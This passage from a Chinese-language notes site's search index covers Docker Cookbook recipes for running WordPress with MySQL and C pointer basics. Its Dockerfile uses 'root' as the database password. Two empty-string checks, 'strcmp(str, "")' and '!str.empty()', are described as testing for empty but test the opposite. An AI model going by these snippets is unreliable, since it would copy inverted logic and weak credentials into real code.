2\uff08\u5373httpd\uff09\u3001PHP\u4ee5\u53ca\u6700\u65b0\u7248\u672c\u7684WordPress\u3002\u4f60\u5c06\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u7528\u4e8eWordPress\u7684\u6570\u636e\u5e93\u3002\u5728\u8be5\u8303\u4f8b\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0cWordPress\u6570\u636e\u5e93\u7528\u6237\u540d\u4e3aroot\uff0c\u5bc6\u7801\u4e5f\u662froot\uff0c\u6570\u636e\u5e93\u540d\u4e3awordpress\u3002\u5982\u679c\u4f60\u60f3\u5bf9\u6570\u636e\u5e93\u7684\u914d\u7f6e\u8fdb\u884c\u4fee\u6539\uff0c\u9700\u8981\u540c\u65f6\u4fee\u6539wp-config.php\u548cDockerfile\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff0c\u5e76\u8ba9\u5b83\u4eec\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\u3002 Dockerfile\u6587\u4ef6\u7528\u6765\u63cf\u8ff0\u4e00\u4e2aDocker\u955c\u50cf\u662f\u5982\u4f55\u6784\u5efa\u7684\uff0c\u540e\u9762\u7ae0\u8282\u4f1a\u6709\u5173\u4e8eDockerfile\u7684\u8be6\u7ec6\u8bf4\u660e\u3002\u5982\u679c\u8fd9\u662f\u4f60\u7b2c\u4e00\u6b21\u4f7f\u7528Dockerfile\u6587\u4ef6\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e0b\u9762\u7684\u6587\u4ef6\uff0c\u4ee5\u540e\u518d\u5b66\u4e60Dockerfile\uff08\u53c2\u89c1\u8303\u4f8b2.3\u5bf9Dockerfile\u7684\u4ecb\u7ecd\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 FROM ubuntu:14.04 RUN apt-get update \uff06\uff06 apt-get -y install \\ apache2 \\ php5 \\ php5-mysql \\ supervisor \\ wget RUN echo 'mysql-server mysql-server/root_password password root' | \\ debconf-set-selections \uff06\uff06 \\ echo 'mysql-server mysql-server/root_password_again password root' | \\ debconf-set-selections RUN apt-get install -qqy mysql-server RUN wget http://wordpress.org/latest.tar.gz \uff06\uff06 \\ tar xzvf latest.tar.gz \uff06\uff06 \\ cp -R ./wordpress/* /var/www/html \uff06\uff06 \\ rm /var/www/html/index.html RUN ( /usr/bin/mysqld_safe \uff06 ) ; sleep 5 ; mysqladmin -u root -proot create wordpress COPY wp-config.php /var/www/html/wp-config.php COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf EXPOSE 80 CMD [ \"/usr/bin/supervisord\" ] Supervisor\u7684\u914d\u7f6e\u6587\u4ef6supervisord.conf\u5982\u4e0b\u6240\u793a\u3002 1 2 3 4 5 6 7 8 9 [supervisord] nodaemon = true [program\uff1amysqld] command = /usr/bin/mysqld_safe autostart = true autorestart = true user = root [program\uff1ahttpd] command = /bin/bash -c \"rm -rf /run/httpd/* \uff06\uff06 /usr/sbin/apachectl -D FOREGROUND\" \u8fd9\u91cc\u5b9a\u4e49\u4e86\u4e24\u4e2a\u88ab\u76d1\u63a7\u548c\u8fd0\u884c\u7684\u670d\u52a1\uff1amysqld\u548chttpd\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982autorestart\u548cautostart\u7b49\u9009\u9879\u3002\u6700\u91cd\u8981\u7684\u6307\u4ee4\u662fcommand\uff0c\u5176\u5b9a\u4e49\u4e86\u5982\u4f55\u8fd0\u884c\u6bcf\u4e2a\u7a0b\u5e8f\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0cDocker\u5bb9\u5668\u53ea\u9700\u8981\u8fd0\u884c\u4e00\u4e2a\u524d\u53f0\u8fdb\u7a0b\uff1asupervisord\u3002\u4eceDockerfile\u4e2d\u7684 CMD [\"/usr/bin/supervisord\"] \u8fd9\u4e00\u884c\u4e5f\u80fd\u770b\u51fa\u6765\u3002 \u5728\u4f60\u7684Docker\u4e3b\u673a\u4e0a\uff0c\u6784\u5efa\u8be5\u955c\u50cf\u5e76\u542f\u52a8\u4e00\u4e2a\u540e\u53f0\u5bb9\u5668\u3002\u5982\u679c\u6309\u7167\u4f8b\u5b50\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u4e86\u57fa\u4e8eVagrant\u7684\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u3002 1 2 3 $ cd /vagrant $ docker build -t wordpress . $ docker run -d -p 80 \uff1a80 wordpress \u5bb9\u5668\u542f\u52a8\u540e\u8fd8\u4f1a\u5728\u5bbf\u4e3b\u673a\u548cDocker\u5bb9\u5668\u4e4b\u95f4\u4e3a80\u7aef\u53e3\u8fdb\u884c\u7aef\u53e3\u6620\u5c04\u3002\u73b0\u5728\u53ea\u9700\u8981\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00http://\uff1cip of docker_host\uff1e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u5165\u5230WordPress\u7684\u914d\u7f6e\u9875\u9762\u4e86\u3002","title":"1.15.2 \u89e3\u51b3\u65b9\u6848"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1153","text":"\u5c3d\u7ba1\u901a\u8fc7Supervisor\u5728\u4e00\u4e2a\u5bb9\u5668\u5185\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u5e94\u7528\u670d\u52a1\u5de5\u4f5c\u8d77\u6765\u975e\u5e38\u5b8c\u7f8e\uff0c\u4f46\u662f\u4f60\u6700\u597d\u8fd8\u662f\u4f7f\u7528\u591a\u4e2a\u5bb9\u5668\u6765\u8fd0\u884c\u4e0d\u540c\u7684\u670d\u52a1\u3002\u8fd9\u80fd\u5145\u5206\u5229\u7528\u5bb9\u5668\u7684\u9694\u79bb\u4f18\u52bf\uff0c\u4e5f\u80fd\u5e2e\u52a9\u4f60\u521b\u5efa\u57fa\u4e8e\u5fae\u670d\u52a1\u8bbe\u8ba1\u601d\u60f3\u7684\u5e94\u7528\uff08\u53c2\u89c1\u300a\u5fae\u670d\u52a1\u8bbe\u8ba1\u300b\uff09\u3002\u6700\u7ec8\u8fd9\u4e5f\u5c06\u4f1a\u4f7f\u4f60\u7684\u5e94\u7528\u66f4\u5177\u5f39\u6027\u548c\u53ef\u6269\u5c55\u6027\u3002","title":"1.15.3 \u8ba8\u8bba"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1154","text":"Supervisor \u6587\u6863\uff08 http://supervisord.org/index.html \uff09 Docker Supervisor \u6587\u6863\uff08 https://docs.docker.com/articles/using_supervisord/ \uff09","title":"1.15.4 \u53c2\u8003"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#116-wordpress","text":"","title":"1.16 \u4f7f\u7528\u4e24\u4e2a\u94fe\u63a5\u5728\u4e00\u8d77\u7684\u5bb9\u5668\u8fd0\u884c WordPress \u535a\u5ba2\u7a0b\u5e8f"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1161","text":"\u4f60\u5e0c\u671b\u901a\u8fc7\u5bb9\u5668\u6765\u8fd0\u884c\u4e00\u4e2aWordPress\u7f51\u7ad9\uff08 http://wordpress.com/ \uff09\uff0c\u4f46\u662f\u4f60\u4e0d\u60f3\u8ba9MySQL\u548cWordPress\u5728\u540c\u4e00\u4e2a\u5bb9\u5668\u4e2d\u8fd0\u884c\u3002\u4f60\u65f6\u523b\u8c28\u8bb0\u5bf9\u5173\u6ce8\u70b9\u8fdb\u884c\u5206\u79bb\u7684\u539f\u5219\uff0c\u5e76\u5c3d\u53ef\u80fd\u5730\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u4e0d\u540c\u7ec4\u4ef6\u8fdb\u884c\u89e3\u8026\u3002","title":"1.16.1 \u95ee\u9898"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1162","text":"\u542f\u52a8\u4e24\u4e2a\u5bb9\u5668\uff1a\u4e00\u4e2a\u8fd0\u884c\u6765\u81eaDocker Hub\uff08 http://hub.docker.com/ \uff09\u7684\u5b98\u65b9WordPress\uff0c\u53e6\u4e00\u4e2a\u8fd0\u884cMySQL\u6570\u636e\u5e93\u3002\u8fd9\u4e24\u4e2a\u5bb9\u5668\u901a\u8fc7Docker\u547d\u4ee4\u884c\u5de5\u5177\u7684 \u2014\u2014link \u9009\u9879\u94fe\u63a5\u5728\u4e00\u8d77\u3002 \u5f00\u59cb\u4e0b\u8f7d\u6700\u65b0\u7684WordPress\uff08 https://hub.docker.com/_/wordpress \uff09\u548cMySQL\uff08 https://hub.docker.com/_/mysql/ \uff09\u955c\u50cf\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 3 $ docker pull wordpress:latest $ docker pull mysql:latest $ docker images","title":"1.16.2 \u89e3\u51b3\u65b9\u6848"},{"location":"reading_notes/pointer/0/","text":"\u7b2c0\u7ae0 \u672c\u4e66\u7684\u76ee\u6807\u4e0e\u7ed3\u6784\u2014\u2014\u5f15\u8a00 0.2 \u76ee\u6807\u8bfb\u8005\u548c\u5185\u5bb9\u7ed3\u6784 Page 4 \u5bf9\u4e8e\u6307\u9488\u548c\u6570\u7ec4\u7684\u76f8\u4e92\u5173\u7cfb\uff0c\u5e02\u9762\u4e0a\u591a\u6570\u7684C\u8bed\u8a00\u5165\u95e8\u4e66\u7c4d\u53ea\u662f\u542b\u6df7\u5176\u8f9e\u5730\u505a\u4e86\u6577\u884d\u89e3\u91ca\uff08\u5305\u62ecK&R\uff0c\u6211\u8ba4\u4e3a\u8be5\u4e66\u662f\u8bf8\u6076\u4e4b\u6e90\uff09\u3002\u8fd9\u8fd8\u4e0d\u7b97\uff0c\u4ed6\u4eec\u8fd8\u5c06\u672c\u6765\u5df2\u7ecf\u7528\u6570\u7ec4\u5199\u597d\u7684\u7a0b\u5e8f\uff0c \u7279\u5730\u7528\u6307\u9488\u8fd0\u7b97\u7684\u65b9\u5f0f\u91cd\u65b0\u7f16\u5199 \uff0c\u8fd8\u8bf4\u4ec0\u4e48\u201c\u8fd9\u6837\u624d\u50cf C\u8bed\u8a00\u7684\u98ce\u683c \u201d\u3002 \u50cfC\u8bed\u8a00\u7684\u98ce\u683c\uff1f\u4e5f\u8bb8\u662f\u53ef\u4ee5\u8fd9\u4e48\u8bf4\uff0c\u4f46\u662f\u4ee5\u6b64\u4e3a\u7531\u70ae\u5236\u51fa\u6765\u7684\u96be\u61c2\u7684\u5199\u6cd5\uff0c\u5230\u5e95\u597d\u5728\u54ea\u91cc\uff1f\u54e6\uff1f\u6267\u884c\u6548\u7387\u9ad8\uff1f\u4e3a\u4ec0\u4e48\uff1f\u8fd9\u662f\u771f\u7684\u5417? \u4ea7\u751f\u8fd9\u4e9b\u7591\u95ee\u662f\u6b63\u5e38\u7684\uff0c\u5e76\u4e14\uff0c \u8fd9\u4e48\u60f3\u662f\u6b63\u786e\u7684 \u3002 \u4e86\u89e3C\u8bed\u8a00\u7684\u53d1\u5c55\u8fc7\u7a0b\uff0c\u5c31\u80fd\u7406\u89e3C\u4e3a\u4ec0\u4e48\u4f1a\u6709\u201c\u6307\u9488\u8fd0\u7b97\u201d\u7b49\u8fd9\u6837 \u5947\u602a\u7684 \u529f\u80fd\u3002 Page 6 \"\u53cd\u6b63\u5927\u5bb6\u90fd\u662f\u8fd9\u4e48\u5199\uff0c\u6211\u4e5f\u8fd9\u4e48\u5199\uff0c\u7a0b\u5e8f\u5c31\u80fd\u8dd1\u8d77\u6765\u3002\" \u8fd9\u79cd\u60f3\u6cd5\uff0c\u8ba9\u4eba\u611f\u89c9\u6709\u70b9 \u60b2\u54c0 \u3002 \u6211\u5e0c\u671b\u4e0d\u4ec5\u662f\u521d\u5b66\u8005\uff0c\u90a3\u4e9b\u5df2\u7ecf\u79ef\u7d2f\u4e86\u4e00\u5b9a\u7ecf\u9a8c\u7684\u7a0b\u5e8f\u5458\u4e5f\u80fd\u9605\u8bfb\u672c\u4e66\u3002\u901a\u8fc7\u6df1\u5165\u7406\u89e3C\u7684\u8bed\u6cd5\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u771f\u6b63\u9886\u4f1a\u76f4\u5230\u4eca\u5929\u8fd8\u50cf\u201c\u53e3\u5934\u7985\u201d\u4e00\u6837\u4f7f\u7528\u7684\u90a3\u4e9b\u7a0b\u5e8f\u60ef\u7528\u5199\u6cd5\u3002 \u65e0\u8bba\u5982\u4f55\uff0c\u8ba9\u6211\u4eec\u505a\u5230\u201c\u77e5\u5176\u7136\u77e5\u5176\u6240\u4ee5\u7136\u201d\uff0c\u8fd9\u6837\u6709\u5229\u5fc3\u7406\u5065\u5eb7\uff0c\u4e0d\u662f\u5417\uff1f","title":"\u7b2c0\u7ae0 \u672c\u4e66\u7684\u76ee\u6807\u4e0e\u7ed3\u6784\u2014\u2014\u5f15\u8a00"},{"location":"reading_notes/pointer/0/#0","text":"","title":"\u7b2c0\u7ae0 \u672c\u4e66\u7684\u76ee\u6807\u4e0e\u7ed3\u6784\u2014\u2014\u5f15\u8a00"},{"location":"reading_notes/pointer/0/#02","text":"","title":"0.2 \u76ee\u6807\u8bfb\u8005\u548c\u5185\u5bb9\u7ed3\u6784"},{"location":"reading_notes/pointer/0/#page-4","text":"\u5bf9\u4e8e\u6307\u9488\u548c\u6570\u7ec4\u7684\u76f8\u4e92\u5173\u7cfb\uff0c\u5e02\u9762\u4e0a\u591a\u6570\u7684C\u8bed\u8a00\u5165\u95e8\u4e66\u7c4d\u53ea\u662f\u542b\u6df7\u5176\u8f9e\u5730\u505a\u4e86\u6577\u884d\u89e3\u91ca\uff08\u5305\u62ecK&R\uff0c\u6211\u8ba4\u4e3a\u8be5\u4e66\u662f\u8bf8\u6076\u4e4b\u6e90\uff09\u3002\u8fd9\u8fd8\u4e0d\u7b97\uff0c\u4ed6\u4eec\u8fd8\u5c06\u672c\u6765\u5df2\u7ecf\u7528\u6570\u7ec4\u5199\u597d\u7684\u7a0b\u5e8f\uff0c \u7279\u5730\u7528\u6307\u9488\u8fd0\u7b97\u7684\u65b9\u5f0f\u91cd\u65b0\u7f16\u5199 \uff0c\u8fd8\u8bf4\u4ec0\u4e48\u201c\u8fd9\u6837\u624d\u50cf C\u8bed\u8a00\u7684\u98ce\u683c \u201d\u3002 \u50cfC\u8bed\u8a00\u7684\u98ce\u683c\uff1f\u4e5f\u8bb8\u662f\u53ef\u4ee5\u8fd9\u4e48\u8bf4\uff0c\u4f46\u662f\u4ee5\u6b64\u4e3a\u7531\u70ae\u5236\u51fa\u6765\u7684\u96be\u61c2\u7684\u5199\u6cd5\uff0c\u5230\u5e95\u597d\u5728\u54ea\u91cc\uff1f\u54e6\uff1f\u6267\u884c\u6548\u7387\u9ad8\uff1f\u4e3a\u4ec0\u4e48\uff1f\u8fd9\u662f\u771f\u7684\u5417? \u4ea7\u751f\u8fd9\u4e9b\u7591\u95ee\u662f\u6b63\u5e38\u7684\uff0c\u5e76\u4e14\uff0c \u8fd9\u4e48\u60f3\u662f\u6b63\u786e\u7684 \u3002 \u4e86\u89e3C\u8bed\u8a00\u7684\u53d1\u5c55\u8fc7\u7a0b\uff0c\u5c31\u80fd\u7406\u89e3C\u4e3a\u4ec0\u4e48\u4f1a\u6709\u201c\u6307\u9488\u8fd0\u7b97\u201d\u7b49\u8fd9\u6837 \u5947\u602a\u7684 \u529f\u80fd\u3002","title":"Page 4"},{"location":"reading_notes/pointer/0/#page-6","text":"\"\u53cd\u6b63\u5927\u5bb6\u90fd\u662f\u8fd9\u4e48\u5199\uff0c\u6211\u4e5f\u8fd9\u4e48\u5199\uff0c\u7a0b\u5e8f\u5c31\u80fd\u8dd1\u8d77\u6765\u3002\" \u8fd9\u79cd\u60f3\u6cd5\uff0c\u8ba9\u4eba\u611f\u89c9\u6709\u70b9 \u60b2\u54c0 \u3002 \u6211\u5e0c\u671b\u4e0d\u4ec5\u662f\u521d\u5b66\u8005\uff0c\u90a3\u4e9b\u5df2\u7ecf\u79ef\u7d2f\u4e86\u4e00\u5b9a\u7ecf\u9a8c\u7684\u7a0b\u5e8f\u5458\u4e5f\u80fd\u9605\u8bfb\u672c\u4e66\u3002\u901a\u8fc7\u6df1\u5165\u7406\u89e3C\u7684\u8bed\u6cd5\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u771f\u6b63\u9886\u4f1a\u76f4\u5230\u4eca\u5929\u8fd8\u50cf\u201c\u53e3\u5934\u7985\u201d\u4e00\u6837\u4f7f\u7528\u7684\u90a3\u4e9b\u7a0b\u5e8f\u60ef\u7528\u5199\u6cd5\u3002 \u65e0\u8bba\u5982\u4f55\uff0c\u8ba9\u6211\u4eec\u505a\u5230\u201c\u77e5\u5176\u7136\u77e5\u5176\u6240\u4ee5\u7136\u201d\uff0c\u8fd9\u6837\u6709\u5229\u5fc3\u7406\u5065\u5eb7\uff0c\u4e0d\u662f\u5417\uff1f","title":"Page 6"},{"location":"reading_notes/pointer/1/","text":"1.1.8 C\u662f\u53ea\u80fd\u4f7f\u7528\u6807\u91cf\u7684\u8bed\u8a00 Page 15 \u5bf9\u4e8e \u6807\u91cf \uff08scalar\uff09\u8fd9\u4e2a\u8bcd\uff0c\u5927\u5bb6\u53ef\u80fd\u6709\u4e9b\u964c\u751f\u3002 \u7b80\u5355\u5730\u8bf4\uff0c\u6807\u91cf\u5c31\u662f\u6307char\u3001int\u3001double\u548c\u679a\u4e3e\u578b\u7b49\u6570\u503c\u7c7b\u578b\uff0c\u4ee5\u53ca\u6307\u9488\u3002\u76f8\u5bf9\u5730\uff0c\u50cf\u6570\u7ec4\u3001\u7ed3\u6784\u4f53\u548c\u5171\u7528\u4f53\u8fd9\u6837\u7684\u5c06\u591a\u4e2a\u6807\u91cf\u8fdb\u884c\u7ec4\u5408\u7684\u7c7b\u578b\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a \u805a\u5408\u7c7b\u578b \uff08aggregate\uff09\u3002 \u65e9\u671f\u7684C\u8bed\u8a00 \u4e00\u5ea6\u53ea\u80fd\u4f7f\u7528\u6807\u91cf \u3002 \u7ecf\u5e38\u542c\u5230\u521d\u5b66\u8005\u6709\u4ee5\u4e0b\u7684\u63d0\u95ee\uff1a if (str == \"abc\") \u8fd9\u6837\u7684\u4ee3\u7801\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u6267\u884c\u9884\u671f\u7684\u52a8\u4f5c\u5462\uff1f\u786e\u5b9e\u5df2\u7ecf\u5c06\u201cabc\u201d\u653e\u5230\u4e86str\u4e2d\uff0c\u6761\u4ef6\u8868\u8fbe\u5f0f\u7684\u503c\u5374\u4e0d\u4e3a\u771f\u3002\u8fd9\u662f\u4e3a\u4ec0\u4e48\uff1f \u5bf9\u4e8e\u8fd9\u6837\u7684\u7591\u95ee\uff0c\u901a\u5e38\u7ed9\u51fa\u7684\u7b54\u6848\u662f\u201c\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u4e0d\u662f\u5728\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\uff0c\u5b83\u53ea\u662f\u5728\u6bd4\u8f83\u6307\u9488\u201d\uff0c\u5176\u5b9e\u8fd8\u53ef\u4ee5\u7ed9\u51fa\u53e6\u5916\u4e00\u4e2a\u7b54\u6848\uff1a \u5b57\u7b26\u4e32\u5176\u5b9e\u5c31\u662fchar\u7c7b\u578b\u7684 \u6570\u7ec4 \uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u4e0d\u662f\u6807\u91cf\uff0c\u5f53\u7136\u5728C\u91cc\u9762\u4e0d\u80fd\u7528==\u8fdb\u884c\u6bd4\u8f83\u4e86\u3002 \u6765\u8ba8\u8bba\u4e00\u4e0b\u8fd9\u4e2a\u95ee\u9898\uff0c\u5bf9\u4e8e(str == \"abc\")\u8fd9\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528CLion\uff0c\u4f60\u5e94\u8be5\u4f1a\u5f97\u5230\u4e00\u4e2awarning: Result of comparison against a string literal is unspecified (use strcmp instead)\u3002\u5de6\u4fa7\u662fchar *\uff08\u6307\u5411\u4e86char\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u53f3\u4fa7\u4e5f\u662fchar *\uff08\u6307\u5411\u4e86\u5b57\u7b26\u4e32\u5b57\u9762\u91cf\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u4e5f\u5c31\u662f\u4e66\u4e2d\u6240\u8bf4\u7684\u8fd9\u662f\u5728\u6bd4\u8f83\u6307\u9488\u3002 \u53e6\u5916\uff0c\u6211\u8fd8\u770b\u89c1\u6709\u5927\u4e00\u540c\u5b66\u5199(str == \"\")\u8fd9\u6837\u7684\u8868\u8fbe\u5f0f\u6765\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a\uff0c\u8fd9\u6837\u7684\u6bd4\u8f83\u6b63\u5982\u4e0a\u6587\u6240\u8bf4\uff0c\u81ea\u7136\u4e0d\u80fd\u6210\u529f\u3002\u5982\u679c\u771f\u7684\u9700\u8981\u6bd4\u8f83\uff0c\u5e94\u5f53\u4f7f\u7528strcmp()\u51fd\u6570\u3002\u5982\u679c\u662f\u4e3a\u4e86\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a\uff0c\u53ef\u4ee5\u8fd9\u6837\uff1a 1 if ( strcmp ( str , \"\" )) { } \u6216\u8005\u5bf9\u521d\u59cb\u5316\u540e\u7684char\u578b\u6570\u7ec4\uff1a 1 if ( strlen ( str ) == 0 ) { } \u4e00\u672c\u6b63\u7ecf\u5730\u5f3a\u8c03\u8981\u521d\u59cb\u5316...\u56e0\u4e3a\u4e0d\u521d\u59cb\u5316\u7528\u8fd9\u4e2a\u662f\u5f88\u5371\u9669\u7684\uff0c\u7136\u540e\u5927\u90e8\u5206\u540c\u5b66\u7528\u7684Dev-C++\u4e5f\u4e0d\u4f1a\u8b66\u544a\u53d8\u91cf\u672a\u521d\u59cb\u5316\uff0c\u4e5f\u5c31\u5f88\u7ecf\u5e38\u6ca1\u5199\u597d\u521d\u59cb\u5316\uff08\u5176\u5b9e\u5c31\u7b97\u6709\u8b66\u544a\u6211\u4e5f\u6562\u6253\u8d4c\u597d\u591a\u540c\u5b66\u8fd8\u662f\u5f3a\u884c\u5ffd\u7565\uff09\uff0c\u7136\u540e\u559c\u6b22\u8bf4\u201c\u672c\u5730\u8fc7\u4e86\u5c31\u662f\u8fc7\u4e86\uff0c\u63d0\u793aWA\u8bf4\u660eOJ\u6709\u95ee\u9898\u201d\u8fd9\u6837\u4e0d\u8d1f\u8d23\u4efb\u7684\u8bdd\u3002\u8bb2\u771f\u53ea\u8981\u628a\u540e\u53f0\u6570\u636e\u62ff\u51fa\u6765\u8bd5\u4e00\u4e0b\uff0c99.9999%\u7684\u9505\u90fd\u662f\u5b66\u751f\u7684\u9505\u3002\uff08\u644a\u624b.jpg\uff09 \u597d\u5427\u8dd1\u9898\u8dd1\u5f97\u6709\u70b9\u8fdc\uff0c\u56de\u6765\u7ee7\u7eed\u770b\u5b57\u7b26\u4e32...\u53c8\u6216\u8005\uff0c\u76f4\u63a5\u4f7f\u7528C++\u7684STL\uff1a 1 2 std :: string str ; if ( str == \"\" ) { } \u5f53\u4f60\u4f7f\u7528string\u5bb9\u5668\u65f6\uff0c\u786e\u5b9e\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528==\u7b26\u53f7\u6765\u5224\u65ad\u662f\u5426\u76f8\u7b49\u3002\u8fd9\u4e2a\u65f6\u5019\u53ef\u80fd\u6709\u4eba\u8981\u9a82\u6211\u4e86\uff0c\u5148\u522b\u6025... 1 2 std :: string str ; if ( ! str . empty ()) { } \u53ea\u9700\u8981\u8c03\u7528empty()\u65b9\u6cd5\u5c31\u53ef\u4ee5\u5224\u65adstr\u662f\u5426\u4e3a\u7a7a\u4e86\u3002 1.2.1 \u6076\u540d\u662d\u8457\u7684\u6307\u9488\u7a76\u7adf\u662f\u4ec0\u4e48 Page 16 \u5173\u4e8e\u201c\u6307\u9488\u201d\u4e00\u8bcd\uff0c\u5728K&R\u4e2d\u6709\u4e0b\u9762\u8fd9\u6837\u7684\u8bf4\u660e\uff08\u7b2c5\u7ae0\u201c\u6307\u9488\u548c\u6570\u7ec4\u201d\u7684\u5f00\u5934\u90e8\u5206\uff09\uff1a \u6307\u9488\u662f\u4e00\u79cd\u4fdd\u5b58\u53d8\u91cf\u5730\u5740\u7684\u53d8\u91cf\uff0c\u5728C\u4e2d\u9891\u7e41\u5730\u4f7f\u7528\u3002 \u5176\u5b9e\u5728\u8868\u8fbe\u4e0a\uff0c\u8fd9\u6837\u7684\u8bf4\u660e\u662f\u6709\u5f88\u5927\u95ee\u9898\u7684\u3002\u603b\u4f1a\u8ba9\u4eba\u611f\u89c9\uff0c\u4e00\u65e6\u63d0\u8d77\u6307\u9488\uff0c\u5c31\u8981\u628a\u5b83\u5f53\u4f5c\u53d8\u91cf\u7684\u610f\u601d\u3002\u5b9e\u9645\u4e0a\u5e76\u975e\u603b\u662f\u5982\u6b64\u3002 \u6b64\u5916\uff0c\u5728C\u8bed\u8a00\u6807\u51c6\u4e2d\u6700\u521d\u51fa\u73b0\u201c\u6307\u9488\u201d\u4e00\u8bcd\u7684\u90e8\u5206\uff0c\u6709\u8fd9\u6837\u4e00\u6bb5\u8bdd\uff1a \u6307\u9488\u7c7b\u578b \uff08pointer type\uff09\u53ef\u7531\u51fd\u6570\u7c7b\u578b\u3001\u5bf9\u8c61\u7c7b\u578b\u6216\u4e0d\u5b8c\u5168\u7684\u7c7b\u578b\u6d3e\u751f\uff0c\u6d3e\u751f\u6307\u9488\u7c7b\u578b\u7684\u7c7b\u578b\u79f0\u4e3a\u5f15\u7528\u7c7b\u578b\u3002\u6307\u9488\u7c7b\u578b\u63cf\u8ff0\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8be5\u7c7b\u5bf9\u8c61\u7684\u503c\u63d0\u4f9b\u5bf9\u8be5\u5f15\u7528\u7c7b\u578b\u5b9e\u4f53\u7684\u5f15\u7528\u3002\u7531\u5f15\u7528\u7c7b\u578b T \u6d3e\u751f\u7684\u6307\u9488\u7c7b\u578b\u6709\u65f6\u79f0\u4e3a\u201c\uff08\u6307\u5411\uff09T\u7684\u6307\u9488\u201d\u3002\u4ece\u5f15\u7528\u7c7b\u578b\u6784\u9020\u6307\u9488\u7c7b\u578b\u7684\u8fc7\u7a0b\u79f0\u4e3a\u201c\u6307\u9488\u7c7b\u578b\u7684\u6d3e\u751f\u201d\u3002\u8fd9\u4e9b\u6784\u9020\u6d3e\u751f\u7c7b\u578b\u7684\u65b9\u6cd5\u53ef\u4ee5\u9012\u5f52\u5730\u5e94\u7528\u3002 \u8fd9\u6bb5\u8bdd\u7684\u5185\u5bb9\u4e5f\u8bb8\u4f1a\u8ba9\u4f60\u4e00\u5934\u96fe\u6c34\u3002\u90a3\u5c31\u8ba9\u6211\u4eec\u5148\u5173\u6ce8\u7b2c\u4e00\u53e5\u8bdd\u5427\uff0c\u90a3\u91cc\u51fa\u73b0\u4e86\u201c\u6307\u9488\u7c7b\u578b\u201d\u4e00\u8bcd\u3002 \u63d0\u5230\u201c\u7c7b\u578b\u201d\uff0c\u7acb\u523b\u4f1a\u8ba9\u4eba\u60f3\u8d77\u201cint\u7c7b\u578b\u201d\u3001\u201cdouble\u7c7b\u578b\u201d\u7b49\u3002\u540c\u6837\uff0c\u5728C\u8bed\u8a00\u4e2d\u4e5f\u5b58\u5728\u201c\u6307\u9488\u7c7b\u578b\u201d\u8fd9\u6837\u7684\u7c7b\u578b\u3002 \u201c\u6307\u9488\u7c7b\u578b\u201d\u5176\u5b9e\u4e0d\u662f\u5355\u72ec\u5b58\u5728\u7684\uff0c\u5b83\u662f\u7531\u5176\u4ed6\u7c7b\u578b \u6d3e\u751f \u800c\u6210\u7684\u3002\u4ee5\u4e0a\u5bf9\u6807\u51c6\u5185\u5bb9\u7684\u5f15\u7528\u4e2d\u4e5f\u63d0\u5230\u201c\u7531\u5f15\u7528\u7c7b\u578bT\u6d3e\u751f\u7684\u6307\u9488\u7c7b\u578b\u6709\u65f6\u79f0\u4e3a\u2018\uff08\u6307\u5411\uff09 T\u7684\u6307\u9488\u2019\u201d\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u5b9e\u9645\u4e0a\u5b58\u5728\u7684\u7c7b\u578b\u662f\u201c\u6307\u5411int\u7684\u6307\u9488\u7c7b\u578b\u201d\u3001\u201c\u6307\u5411double\u7684\u6307\u9488\u7c7b\u578b\u201d\u3002 